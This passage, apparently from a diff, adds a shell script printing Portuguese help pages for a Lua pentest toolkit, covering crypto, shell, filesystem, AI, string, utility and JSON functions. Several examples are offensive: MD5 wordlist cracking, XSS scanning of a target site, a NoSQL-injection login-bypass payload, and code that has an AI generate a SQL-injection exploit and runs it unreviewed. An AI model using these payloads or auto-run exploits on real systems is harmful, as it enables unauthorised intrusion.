+    printf "  \033[0;90m  print(crypto.b64d(enc))                --> 'ola mundo'\033[0m\n\n"
+    printf "\033[1;36m── AES ────────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mcrypto.aes_enc\033[0m(key, data)  → string cifrada\033[0m\n"
+    printf "  \033[1;33mcrypto.aes_dec\033[0m(key, data)  → string original\033[0m\n"
+    printf "  \033[1;31m  ⚠ key deve ter exatamente 32 bytes (AES-256)\033[0m\n"
+    printf "  \033[0;90m  local k   = 'chave_de_32_bytes_exatamente__'\033[0m\n"
+    printf "  \033[0;90m  local enc = crypto.aes_enc(k, 'segredo')\033[0m\n"
+    printf "  \033[0;90m  local dec = crypto.aes_dec(k, enc)  --> 'segredo'\033[0m\n\n"
+    printf "\033[1;36m── JWT ────────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mcrypto.jwt\033[0m(token)          → {header={}, payload={}, raw}\033[0m\n"
+    printf "  \033[1;31m  ⚠ decodifica sem verificar assinatura (útil em pentest)\033[0m\n"
+    printf "  \033[0;90m  local t = crypto.jwt('eyJhbGc...')\033[0m\n"
+    printf "  \033[0;90m  print(t.header.alg)    -- 'HS256', 'RS256', 'none'...\033[0m\n"
+    printf "  \033[0;90m  print(t.payload.sub)   -- subject/usuário\033[0m\n"
+    printf "  \033[0;90m  print(t.payload.exp)   -- expiração (epoch)\033[0m\n\n"
+    printf "\033[1;36m── OUTROS ─────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mcrypto.rand\033[0m(n)             → n bytes aleatórios (string binária)\033[0m\n"
+    printf "  \033[0;90m  local token = crypto.b64e(crypto.rand(16))  -- token URL-safe\033[0m\n\n"
+    printf "\033[1;36m── EXEMPLO: CRACK MD5 ─────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[0;90m  local hash  = 'd41d8cd98f00b204e9800998ecf8427e'\033[0m\n"
+    printf "  \033[0;90m  local words = {'admin','123456','senha','root','password'}\033[0m\n"
+    printf "  \033[0;90m  for _, w in ipairs(words) do\033[0m\n"
+    printf "  \033[0;90m    if crypto.md5(w) == hash then\033[0m\n"
+    printf "  \033[0;90m      print('[+] Senha: '..w); break\033[0m\n"
+    printf "  \033[0;90m    end\033[0m\n"
+    printf "  \033[0;90m  end\033[0m\n\n"
+    }
+    _doc_sys() {
+    printf "\033[1;35m═══ sys.* + sh.* — Sistema, Threads e Shell ══════════════════════\033[0m\n\n"
+    printf "\033[1;36m── SHELL ──────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;31m⚠  sys.sh(cmd)\033[0m — assíncrono, retorna PID. NÃO captura output.\033[0m\n\n"
+    printf "  \033[1;32m✓  sh.read\033[0m(cmd)      → string com stdout  (bloqueante)\033[0m\n"
+    printf "  \033[0;90m     local out = sh.read('whoami')\033[0m\n\n"
+    printf "  \033[1;32m✓  sh.capture\033[0m(cmd)   → string, exit_code  (bloqueante)\033[0m\n"
+    printf "  \033[0;90m     local out, code = sh.capture('ls -la 2>&1')\033[0m\n"
+    printf "  \033[0;90m     if code == 0 then print(out) end\033[0m\n\n"
+    printf "  \033[1;32m✓  sh.exec\033[0m(cmd)      → exit_code  (bloqueante, sem captura)\033[0m\n"
+    printf "  \033[0;90m     sh.exec('pkg install nmap -y')\033[0m\n\n"
+    printf "\033[1;36m── THREADS ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33msys.thread\033[0m(fn)        → tid\033[0m\n"
+    printf "  \033[1;33msys.join\033[0m(tid [, ms])  aguarda thread terminar\033[0m\n"
+    printf "  \033[1;33msys.kill\033[0m(id)          encerra task\033[0m\n"
+    printf "  \033[1;33msys.list\033[0m()            lista tasks ativas\033[0m\n"
+    printf "  \033[1;33msys.mutex\033[0m()           cria mutex para sincronização\033[0m\n"
+    printf "  \033[1;33msys.channel\033[0m()         canal entre threads\033[0m\n"
+    printf "  \033[0;90m  local t = sys.thread(function()\033[0m\n"
+    printf "  \033[0;90m    net.scan('192.168.1.1',1,1024)\033[0m\n"
+    printf "  \033[0;90m  end)\033[0m\n"
+    printf "  \033[0;90m  sys.join(t)\033[0m\n\n"
+    printf "\033[1;36m── SISTEMA ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33msys.info\033[0m()            info: CPU, RAM, arch, deps\033[0m\n"
+    printf "  \033[1;33msys.sleep\033[0m(s)          pausa (aceita decimal: sys.sleep(0.1))\033[0m\n"
+    printf "  \033[1;33msys.time\033[0m()            epoch em segundos\033[0m\n"
+    printf "  \033[1;33msys.time_ms\033[0m()         epoch em milissegundos\033[0m\n"
+    printf "  \033[1;33msys.pid\033[0m()             PID do processo atual\033[0m\n"
+    printf "  \033[1;33msys.env\033[0m(var)          lê variável de ambiente\033[0m\n"
+    printf "  \033[1;33msys.env\033[0m(var, val)     seta variável de ambiente\033[0m\n"
+    printf "  \033[1;33msys.exit\033[0m(n)           encerra com código n\033[0m\n"
+    printf "  \033[1;33msys.spawn\033[0m(cmd)        processo filho em background\033[0m\n\n"
+    }
+    _doc_fs() {
+    printf "\033[1;35m═══ fs.* — Filesystem ═════════════════════════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── LEITURA E ESCRITA ──────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mfs.read\033[0m(path)         → string  ou  nil, errmsg\033[0m\n"
+    printf "  \033[0;90m  local txt = fs.read('/etc/hosts')\033[0m\n"
+    printf "  \033[0;90m  for linha in txt:gmatch('[^\\n]+') do print(linha) end\033[0m\n\n"
+    printf "  \033[1;33mfs.write\033[0m(path, data)  cria ou sobrescreve arquivo\033[0m\n"
+    printf "  \033[1;33mfs.append\033[0m(path, data) adiciona ao final\033[0m\n"
+    printf "  \033[0;90m  fs.write('log.txt', '[*] inicio\\n')\033[0m\n"
+    printf "  \033[0;90m  fs.append('log.txt', '[+] achou XSS\\n')\033[0m\n\n"
+    printf "\033[1;36m── INSPEÇÃO ───────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mfs.list\033[0m([dir])        → tabela de nomes (padrão: dir atual)\033[0m\n"
+    printf "  \033[1;33mfs.stat\033[0m(path)         → {size, mtime, ctime, isdir, isfile}\033[0m\n"
+    printf "  \033[1;33mfs.isfile\033[0m(path)       → true/false\033[0m\n"
+    printf "  \033[1;33mfs.isdir\033[0m(path)        → true/false\033[0m\n"
+    printf "  \033[1;33mfs.glob\033[0m(pattern)      → tabela de paths\033[0m\n"
+    printf "  \033[0;90m  for _, f in ipairs(fs.glob('/tmp/*.txt')) do print(f) end\033[0m\n\n"
+    printf "\033[1;36m── OPERAÇÕES ──────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mfs.mkdir\033[0m(path)        cria diretório (e pais)\033[0m\n"
+    printf "  \033[1;33mfs.rm\033[0m(path)           remove arquivo\033[0m\n"
+    printf "  \033[1;33mfs.move\033[0m(src, dst)     move/renomeia\033[0m\n"
+    printf "  \033[1;33mfs.copy\033[0m(src, dst)     copia\033[0m\n"
+    printf "  \033[1;33mfs.chmod\033[0m(path, mode)  muda permissões (ex: '755')\033[0m\n\n"
+    printf "\033[1;36m── EXEMPLO: LOG DE SCAN ───────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[0;90m  local log = '/tmp/scan_'..os.date('%%Y%%m%%d')..'.txt'\033[0m\n"
+    printf "  \033[0;90m  fs.write(log, '[*] '..os.date()..'\\n')\033[0m\n"
+    printf "  \033[0;90m  for _, url in ipairs(mod.spider('http://alvo.com', 50)) do\033[0m\n"
+    printf "  \033[0;90m    local r = mod.xss(url)\033[0m\n"
+    printf "  \033[0;90m    if r and r.vuln then fs.append(log, '[XSS] '..url..'\\n') end\033[0m\n"
+    printf "  \033[0;90m  end\033[0m\n\n"
+    }
+    _doc_ai() {
+    printf "\033[1;35m═══ ai.* — CYN (Inteligência Artificial) ══════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── CHAT E PERGUNTAS ───────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mai.ask\033[0m('pergunta')    → string (sem histórico)\033[0m\n"
+    printf "  \033[1;33mai.chat\033[0m('mensagem')   → string (mantém histórico)\033[0m\n"
+    printf "  \033[1;33mai.clear\033[0m()            limpa histórico\033[0m\n"
+    printf "  \033[0;90m  print(ai.ask('explique SSRF em uma linha'))\033[0m\n\n"
+    printf "\033[1;36m── GERAÇÃO DE CÓDIGO ──────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mai.code\033[0m('tarefa')     → string com código Lua pronto\033[0m\n"
+    printf "  \033[0;90m  local cod = ai.code('port scanner usando net.scan')\033[0m\n"
+    printf "  \033[0;90m  load(cod)()   -- executa direto\033[0m\n\n"
+    printf "\033[1;36m── PROVIDERS ──────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mai.provider\033[0m('sky')                gratuito, sem key (padrão)\033[0m\n"
+    printf "  \033[1;33mai.provider\033[0m('pollinations')       gratuito\033[0m\n"
+    printf "  \033[1;33mai.provider\033[0m('ollama')             local (sem internet)\033[0m\n"
+    printf "  \033[1;33mai.provider\033[0m('groq','modelo')      key gratuita\033[0m\n"
+    printf "  \033[1;33mai.provider\033[0m('openai','gpt-4o')    key paga\033[0m\n"
+    printf "  \033[1;33mai.provider\033[0m('gemini')             key gratuita: aistudio.google.com\033[0m\n"
+    printf "  \033[1;33mai.key\033[0m('SUA_KEY')                configura chave\033[0m\n"
+    printf "  \033[1;33mai.model\033[0m('modelo')               troca modelo\033[0m\n\n"
+    printf "\033[1;36m── BUSCA ──────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mai.search\033[0m('query')    → resultados da web\033[0m\n"
+    printf "  \033[0;90m  print(ai.search('CVE-2024 Apache RCE'))\033[0m\n\n"
+    printf "\033[1;36m── EXEMPLO: PENTEST ASSISTIDO POR IA ──────────────────────────────\033[0m\n\n"
+    printf "  \033[0;90m  local h = mod.headers('https://alvo.com')\033[0m\n"
+    printf "  \033[0;90m  local analise = ai.ask(\033[0m\n"
+    printf "  \033[0;90m    'Analise headers:\\n'..tostring(h))\033[0m\n"
+    printf "  \033[0;90m  print(analise)\033[0m\n"
+    printf "  \033[0;90m  -- gera e executa exploit:\033[0m\n"
+    printf "  \033[0;90m  load(ai.code(\033[0m\n"
+    printf "  \033[0;90m    'SQLi em http://alvo.com/?id='))()\033[0m\n\n"
+    }
+    _doc_string() {
+    printf "\n\033[1;35m═══ string.* — Extensões de String ═══════════════════════════════\033[0m\n\n"
+    printf "  \033[0;90mDisponíveis como funções e como métodos: s:trim()  s:split(\",\")  s:isnumeric()\033[0m\n\n"
+    printf "\033[1;36m── LIMPEZA ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.trim\033[0m(s)                 → remove espaços das duas pontas\n"
+    printf "  \033[0;90m  string.trim('  olá  ')  -->  'olá'\033[0m\n"
+    printf "  \033[1;33mstring.ltrim\033[0m(s)                → remove espaços da esquerda\n"
+    printf "  \033[1;33mstring.rtrim\033[0m(s)                → remove espaços da direita\n\n"
+    printf "\033[1;36m── BUSCA E VERIFICAÇÃO ────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.startswith\033[0m(s, prefix)    → true se s começa com prefix\n"
+    printf "  \033[1;33mstring.endswith\033[0m(s, suffix)      → true se s termina com suffix\n"
+    printf "  \033[1;33mstring.contains\033[0m(s, sub)         → true se sub está em s\n"
+    printf "  \033[1;33mstring.count_occ\033[0m(s, sub)        → número de ocorrências de sub\n"
+    printf "  \033[1;33mstring.removeprefix\033[0m(s, p)       → remove prefixo se presente\n"
+    printf "  \033[1;33mstring.removesuffix\033[0m(s, p)       → remove sufixo se presente\n"
+    printf "  \033[0;90m  string.startswith('ElliotOS','Elliot')  -->  true\033[0m\n\n"
+    printf "\033[1;36m── DIVISÃO ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.split\033[0m(s, sep [, plain])  → tabela de partes\n"
+    printf "  \033[0;90m  string.split('a,b,c',',')  -->  {'a','b','c'}\033[0m\n"
+    printf "  \033[0;90m  string.split('um dois')    -->  {'um','dois'}  (sep padrão: %%s+)\033[0m\n"
+    printf "  \033[1;33mstring.lines\033[0m(s)                 → tabela de linhas (CRLF ok)\n"
+    printf "  \033[1;33mstring.words\033[0m(s)                 → tabela de palavras\n"
+    printf "  \033[1;33mstring.partition\033[0m(s, sep)        → antes, sep, depois (1ª ocorrência)\n"
+    printf "  \033[1;33mstring.rpartition\033[0m(s, sep)       → antes, sep, depois (última)\n"
+    printf "  \033[0;90m  string.partition('user@host','@')  -->  'user','@','host'\033[0m\n\n"
+    printf "\033[1;36m── FORMATAÇÃO E PADDING ───────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.lpad\033[0m(s, n [, ch])        → alinha à direita\n"
+    printf "  \033[1;33mstring.rpad\033[0m(s, n [, ch])        → alinha à esquerda\n"
+    printf "  \033[1;33mstring.ljust\033[0m(s, n [, ch])       → alias de rpad\n"
+    printf "  \033[1;33mstring.rjust\033[0m(s, n [, ch])       → alias de lpad\n"
+    printf "  \033[1;33mstring.center\033[0m(s, n [, ch])      → centraliza com ch\n"
+    printf "  \033[1;33mstring.zfill\033[0m(s, n)              → preenche com zeros à esquerda\n"
+    printf "  \033[1;33mstring.truncate\033[0m(s, n [, suf])   → corta em n chars + sufixo\n"
+    printf "  \033[1;33mstring.repeat_str\033[0m(s, n)         → repete s n vezes\n"
+    printf "  \033[1;33mstring.expandtabs\033[0m(s [, n])      → expande \\t em n espaços (padrão 8)\n"
+    printf "  \033[0;90m  string.lpad('42',6,'0')    -->  '000042'\033[0m\n"
+    printf "  \033[0;90m  string.center('EOS',9,'-') -->  '---EOS---'\033[0m\n\n"
+    printf "\033[1;36m── TRANSFORMAÇÃO DE CASO ──────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.capitalize\033[0m(s)            → Primeira letra maiúscula\n"
+    printf "  \033[1;33mstring.title\033[0m(s)                 → Cada Palavra Maiúscula\n"
+    printf "  \033[1;33mstring.swapcase\033[0m(s)              → inverte maiúsculas/minúsculas\n"
+    printf "  \033[1;33mstring.slugify\033[0m(s)               → Olá Mundo → ola-mundo\n"
+    printf "  \033[0;90m  string.title('olá mundo')    -->  'Olá Mundo'\033[0m\n"
+    printf "  \033[0;90m  string.swapcase('ElliotOS')  -->  'eLLIOTos'\033[0m\n\n"
+    printf "\033[1;36m── HTML E URL ─────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.escape_html\033[0m(s)           → & < > para entidades HTML\n"
+    printf "  \033[1;33mstring.unescape_html\033[0m(s)         → entidades HTML para chars\n"
+    printf "  \033[1;33mstring.encode_url\033[0m(s)            → percent-encoding para URLs\n"
+    printf "  \033[1;33mstring.decode_url\033[0m(s)            → decodifica percent-encoding\n"
+    printf "  \033[1;33mstring.interpolate\033[0m(s, vars)     → substitui {chave} pela tabela vars\n"
+    printf "  \033[0;90m  string.interpolate('{host}:{port}',{host='localhost',port=8080})\033[0m\n"
+    printf "  \033[0;90m  -->  'localhost:8080'\033[0m\n\n"
+    printf "\033[1;36m── VALIDAÇÃO (is*) ────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mstring.isnumeric\033[0m(s)             → true se s representa número\n"
+    printf "  \033[1;33mstring.isinteger\033[0m(s)             → true se representa inteiro\n"
+    printf "  \033[1;33mstring.isalpha\033[0m(s)               → true se só letras\n"
+    printf "  \033[1;33mstring.isalnum\033[0m(s)               → true se letras e dígitos\n"
+    printf "  \033[1;33mstring.isspace\033[0m(s)               → true se só espaços/tabs/newlines\n"
+    printf "  \033[1;33mstring.islower\033[0m(s)               → true se todas minúsculas\n"
+    printf "  \033[1;33mstring.isupper\033[0m(s)               → true se todas maiúsculas\n"
+    printf "  \033[0;90m  string.isnumeric('3.14')   -->  true\033[0m\n"
+    printf "  \033[0;90m  string.isupper('HELLO 1')  -->  true  (dígitos não contam)\033[0m\n\n"
+    printf "  \033[0;90mDica: string.help() no REPL para referência rápida colorida\033[0m\n\n"
+    }
+    _doc_util() {
+    printf "\n\033[1;35m═══ util.* — Stdlib Funcional ═════════════════════════════════════\033[0m\n\n"
+    printf "  \033[0;90mDisponível globalmente. Nunca use require().\033[0m\n"
+    printf "  \033[0;90mutil.help() / util.help('stats') / util.help('iter') / util.help('fn')\033[0m\n\n"
+    printf "\033[1;36m── TRANSFORMAÇÃO ──────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.map\033[0m(t, fn)           → nova tabela com fn(v,i) em cada item\n"
+    printf "  \033[0;90m  util.map({1,2,3}, function(x) return x*2 end)  -->  {2,4,6}\033[0m\n"
+    printf "  \033[1;33mutil.filter\033[0m(t, fn)        → itens onde fn(v) é verdadeiro\n"
+    printf "  \033[0;90m  util.filter({1,2,3,4}, function(x) return x%%2==0 end)  -->  {2,4}\033[0m\n"
+    printf "  \033[1;33mutil.reduce\033[0m(t, fn, acc)   → acumula com fn(acc,v)\n"
+    printf "  \033[0;90m  util.reduce({1,2,3,4,5}, function(a,b) return a+b end, 0)  -->  15\033[0m\n"
+    printf "  \033[1;33mutil.sorted\033[0m(t [, fn])     → cópia ordenada; fn=comparador opcional\n"
+    printf "  \033[1;33mutil.unique\033[0m(t)            → remove duplicatas, mantém ordem\n"
+    printf "  \033[1;33mutil.flatten\033[0m(t [, depth]) → achata tabelas aninhadas\n\n"
+    printf "\033[1;36m── PREDICADOS ─────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.any\033[0m(t, fn)           → true se algum satisfaz fn\n"
+    printf "  \033[1;33mutil.all\033[0m(t, fn)           → true se todos satisfazem fn\n"
+    printf "  \033[1;33mutil.count\033[0m(t, fn_ou_val)  → quantos satisfazem fn ou == val\n\n"
+    printf "\033[1;36m── GERAÇÃO ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.range\033[0m(a [,b [,step]]) → sequência numérica estilo Python\n"
+    printf "  \033[0;90m  util.range(5)       -->  {1,2,3,4,5}\033[0m\n"
+    printf "  \033[0;90m  util.range(0,10,2)  -->  {0,2,4,6,8,10}\033[0m\n"
+    printf "  \033[0;90m  util.range(5,1,-1)  -->  {5,4,3,2,1}\033[0m\n"
+    printf "  \033[1;33mutil.enumerate\033[0m(t [, start]) → {{i,v},...}\n"
+    printf "  \033[1;33mutil.zip\033[0m(t1, t2, ...)      → {{a1,b1},{a2,b2},...}\n"
+    printf "  \033[1;33mutil.chunk\033[0m(t, n)           → divide em blocos de n\n"
+    printf "  \033[0;90m  util.chunk({1,2,3,4,5,6,7},3)  -->  {{1,2,3},{4,5,6},{7}}\033[0m\n\n"
+    printf "\033[1;36m── AGREGAÇÃO ──────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.sum\033[0m(t [, fn])         → soma\n"
+    printf "  \033[1;33mutil.min\033[0m(t [, fn])         → menor valor\n"
+    printf "  \033[1;33mutil.max\033[0m(t [, fn])         → maior valor\n"
+    printf "  \033[1;33mutil.groupby\033[0m(t, fn)        → {chave->{itens}} agrupados por fn\n"
+    printf "  \033[0;90m  util.groupby({1,2,3,4}, function(x) return x%%2==0 and 'par' or 'impar' end)\033[0m\n\n"
+    printf "\033[1;36m── TABELAS E DICTS ────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.keys\033[0m(t)              → lista de chaves\n"
+    printf "  \033[1;33mutil.values\033[0m(t)            → lista de valores\n"
+    printf "  \033[1;33mutil.pick\033[0m(t, keys)        → sub-tabela com as chaves\n"
+    printf "  \033[1;33mutil.omit\033[0m(t, keys)        → sub-tabela sem as chaves\n"
+    printf "  \033[1;33mutil.merge\033[0m(t1, t2, ...)   → une tabelas (direita sobrescreve)\n"
+    printf "  \033[1;33mutil.deepcopy\033[0m(t)          → cópia profunda recursiva\n"
+    printf "  \033[0;90m  util.merge({x=1,y=2},{y=99,z=3})  -->  {x=1,y=99,z=3}\033[0m\n\n"
+    printf "\033[1;36m── FUNÇÕES DE ALTA ORDEM ──────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.partial\033[0m(fn, ...)      → aplicação parcial (currying)\n"
+    printf "  \033[0;90m  local add10 = util.partial(function(a,b) return a+b end, 10)\033[0m\n"
+    printf "  \033[0;90m  add10(5)  -->  15\033[0m\n"
+    printf "  \033[1;33mutil.memoize\033[0m(fn)          → cacheia resultados\n"
+    printf "  \033[1;33mutil.once\033[0m(fn)             → executa só na primeira chamada\n"
+    printf "  \033[1;33mutil.retry\033[0m(fn, n [, ms])  → tenta n vezes com delay\n"
+    printf "  \033[1;33mutil.pipe\033[0m(fn1, fn2, ...)  → composição esq→dir\n"
+    printf "  \033[0;90m  util.pipe(string.trim, string.lower)('  OLÁ  ')  -->  'olá'\033[0m\n"
+    printf "  \033[1;33mutil.compose\033[0m(fn1, fn2, ...) → composição dir→esq\n"
+    printf "  \033[1;33mutil.flip\033[0m(fn)             → inverte ordem dos 2 primeiros args\n"
+    printf "  \033[1;33mutil.tap\033[0m(v, fn)           → chama fn(v) e retorna v\n"
+    printf "  \033[1;33mutil.identity\033[0m(v)          → retorna v\n"
+    printf "  \033[1;33mutil.always\033[0m(v)            → função que sempre retorna v\n"
+    printf "  \033[1;33mutil.default\033[0m(v, d)        → v se não nil, senão d\n"
+    printf "  \033[1;33mutil.truthy\033[0m(v)            → v não é nil nem false\n"
+    printf "  \033[1;33mutil.falsy\033[0m(v)             → v é nil ou false\n\n"
+    printf "\033[1;36m── IO E DEBUG ─────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.printf\033[0m(fmt, ...)     → io.write com string.format\n"
+    printf "  \033[1;33mutil.pp\033[0m(v)                → pretty-print de qualquer valor\n"
+    printf "  \033[1;33mutil.with_file\033[0m(p, m, fn)  → abre arquivo, chama fn(f), fecha\n"
+    printf "  \033[0;90m  util.with_file('saida.txt','w', function(f) f:write('linha\\n') end)\033[0m\n\n"
+    printf "\033[1;36m── ESTATÍSTICAS (util.help('stats')) ──────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.mean\033[0m(t)              → média aritmética\n"
+    printf "  \033[1;33mutil.median\033[0m(t)            → mediana\n"
+    printf "  \033[1;33mutil.mode\033[0m(t)              → valor mais frequente\n"
+    printf "  \033[1;33mutil.variance\033[0m(t)          → variância populacional\n"
+    printf "  \033[1;33mutil.stdev\033[0m(t)             → desvio padrão populacional\n"
+    printf "  \033[1;33mutil.stdev_sample\033[0m(t)      → desvio padrão amostral (n-1)\n"
+    printf "  \033[1;33mutil.percentile\033[0m(t, p)     → percentil p (0-100)\n"
+    printf "  \033[1;33mutil.normalize\033[0m(t)         → normaliza entre 0 e 1\n"
+    printf "  \033[1;33mutil.clamp\033[0m(v, lo, hi)     → limita v ao intervalo [lo,hi]\n"
+    printf "  \033[1;33mutil.round\033[0m(n [, decimals]) → arredonda para N casas decimais\n"
+    printf "  \033[0;90m  util.round(3.14159, 2)  -->  3.14\033[0m\n\n"
+    printf "\033[1;36m── ITERAÇÃO E GENERATORS (util.help('iter')) ──────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.iter\033[0m(t)              → iterador lazy sobre tabela\n"
+    printf "  \033[1;33mutil.generator\033[0m(fn)        → gerador via coroutine (yield)\n"
+    printf "  \033[1;33mutil.take\033[0m(src, n)         → primeiros n valores\n"
+    printf "  \033[1;33mutil.drop\033[0m(t, n)           → sem os primeiros n\n"
+    printf "  \033[1;33mutil.step\033[0m(t, n)           → um a cada n elementos\n"
+    printf "  \033[1;33mutil.tally\033[0m(t)             → {valor->contagem}\n"
+    printf "  \033[1;33mutil.flat_map\033[0m(t, fn)      → map + flatten de nível 1\n"
+    printf "  \033[1;33mutil.interleave\033[0m(a, b)     → mescla alternando elementos\n"
+    printf "  \033[1;33mutil.first\033[0m(t [, fn])      → primeiro (que satisfaz fn)\n"
+    printf "  \033[1;33mutil.last\033[0m(t [, fn])       → último (que satisfaz fn)\n"
+    printf "  \033[1;33mutil.index_of\033[0m(t, val)     → posição do valor (ou nil)\n"
+    printf "  \033[1;33mutil.without\033[0m(t, ...)      → tabela sem os valores listados\n"
+    printf "  \033[1;33mutil.difference\033[0m(a, b)     → elementos de a que não estão em b\n"
+    printf "  \033[1;33mutil.intersection\033[0m(a, b)   → elementos presentes em ambos\n"
+    printf "  \033[1;33mutil.union\033[0m(a, b)          → todos os elementos únicos de a e b\n"
+    printf "  \033[1;33mutil.rotate\033[0m(t, n)         → rotaciona n posições\n"
+    printf "  \033[1;33mutil.transpose\033[0m(m)         → transpõe matrix de tabelas\n"
+    printf "  \033[1;33mutil.combinations\033[0m(t, r)   → todas as combinações de r elementos\n"
+    printf "  \033[1;33mutil.permutations\033[0m(t)      → todas as permutações\n\n"
+    printf "\033[1;36m── PIPELINE ENCADEÁVEL (util.chain) ───────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mutil.chain\033[0m(t)             → objeto com métodos encadeáveis\n"
+    printf "  \033[0;90m  Métodos: :map :filter :sorted :unique :flatten :take :drop\033[0m\n"
+    printf "  \033[0;90m           :reverse :each :value :count :sum :min :max :mean :first :last\033[0m\n"
+    printf "  \033[0;90m  util.chain({5,3,8,1,9,2})\033[0m\n"
+    printf "  \033[0;90m    :filter(function(x) return x > 3 end)\033[0m\n"
+    printf "  \033[0;90m    :sorted():map(function(x) return x*10 end)\033[0m\n"
+    printf "  \033[0;90m    :value()   -->  {50,80,90}\033[0m\n\n"
+    printf "  \033[0;90mDica: util.help() no REPL para referência rápida colorida\033[0m\n\n"
+    }
+    _doc_json() {
+    printf "\033[1;35m═══ json.* — JSON encode/decode ═══════════════════════════════════\033[0m\n\n"
+    printf "\033[1;36m── FUNÇÕES ────────────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[1;33mjson.encode\033[0m(value)   → string JSON  ou  nil\n"
+    printf "  \033[0;90m  Converte qualquer valor Lua em string JSON.\033[0m\n"
+    printf "  \033[0;90m  nil → 'null'   true/false → 'true'/'false'\033[0m\n"
+    printf "  \033[0;90m  number → número   string → string com escapes\033[0m\n"
+    printf "  \033[0;90m  table (array) → [...]   table (dict) → {...}\033[0m\n\n"
+    printf "  \033[0;90m  json.encode(nil)           --> 'null'\033[0m\n"
+    printf "  \033[0;90m  json.encode(true)          --> 'true'\033[0m\n"
+    printf "  \033[0;90m  json.encode(42)            --> '42'\033[0m\n"
+    printf "  \033[0;90m  json.encode('oi')          --> '\"oi\"'\033[0m\n"
+    printf "  \033[0;90m  json.encode({1,2,3})       --> '[1,2,3]'\033[0m\n"
+    printf "  \033[0;90m  json.encode({x=1,y=2})     --> '{\"x\":1,\"y\":2}'\033[0m\n\n"
+    printf "  \033[1;33mjson.decode\033[0m(str)     → value Lua  ou  nil\n"
+    printf "  \033[0;90m  Converte string JSON em valor Lua.\033[0m\n"
+    printf "  \033[0;90m  'null' → nil   'true'/'false' → boolean\033[0m\n"
+    printf "  \033[0;90m  número → number   string → string\033[0m\n"
+    printf "  \033[0;90m  [...] → table array   {...} → table dict\033[0m\n\n"
+    printf "  \033[0;90m  json.decode('null')        --> nil\033[0m\n"
+    printf "  \033[0;90m  json.decode('42')          --> 42\033[0m\n"
+    printf "  \033[0;90m  json.decode('[1,2,3]')     --> {1,2,3}\033[0m\n"
+    printf "  \033[0;90m  local o = json.decode('{\"a\":1,\"b\":{\"c\":99}}')\033[0m\n"
+    printf "  \033[0;90m  print(o.a, o.b.c)          --> 1   99\033[0m\n\n"
+    printf "\033[1;36m── EXEMPLOS REAIS ─────────────────────────────────────────────────\033[0m\n\n"
+    printf "  \033[0;90m  -- consumir API REST:\033[0m\n"
+    printf "  \033[0;90m  local body, code = net.get('https://api.github.com/users/torvalds')\033[0m\n"
+    printf "  \033[0;90m  local u = json.decode(body)\033[0m\n"
+    printf "  \033[0;90m  print(u.name, u.public_repos)\033[0m\n\n"
+    printf "  \033[0;90m  -- POST com JSON:\033[0m\n"
+    printf "  \033[0;90m  local payload = json.encode({user='admin', pass='123'})\033[0m\n"
+    printf "  \033[0;90m  local b, c = net.post(url, payload, 'application/json')\033[0m\n"
+    printf "  \033[0;90m  local resp = json.decode(b)\033[0m\n\n"
+    printf "  \033[0;90m  -- payload NoSQL Injection:\033[0m\n"
+    printf "  \033[0;90m  local nosql = json.encode({username={['\\$ne']=''},\033[0m\n"
+    printf "  \033[0;90m                             password={['\\$ne']=>''}})\033[0m\n"
+    printf "  \033[0;90m  net.post(url, nosql, 'application/json')\033[0m\n\n"
+    printf "  \033[0;90m  -- salvar scan em JSON:\033[0m\n"
+    printf "  \033[0;90m  local resultado = {host='alvo.com', vulns={'xss','sqli'}}\033[0m\n"
+    printf "  \033[0;90m  fs.write('scan.json', json.encode(resultado))\033[0m\n\n"
+    printf "  \033[0;90m  -- roundtrip encode -> decode:\033[0m\n"
+    printf "  \033[0;90m  local orig = {hosts={'127.0.0.1','192.168.1.1'}, port=8080}\033[0m\n"
+    printf "  \033[0;90m  local back = json.decode(json.encode(orig))\033[0m\n"
+    printf "  \033[0;90m  print(back.port, back.hosts[1])  --> 8080  127.0.0.1\033[0m\n\n"
+    }
+    _DOC_SUB="\${2:-}"
+    case "\$_DOC_SUB" in
+      net|rede)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_net | eval "\$_DOC_PAGER"; else _doc_net; fi ;;
+      mod|pentest|scanners)
+        if [ -n "\$_DOC_PAGER" ]; then _doc_mod | eval "\$_DOC_PAGER"; else _doc_mod; fi ;;
+      crypto|crypt)
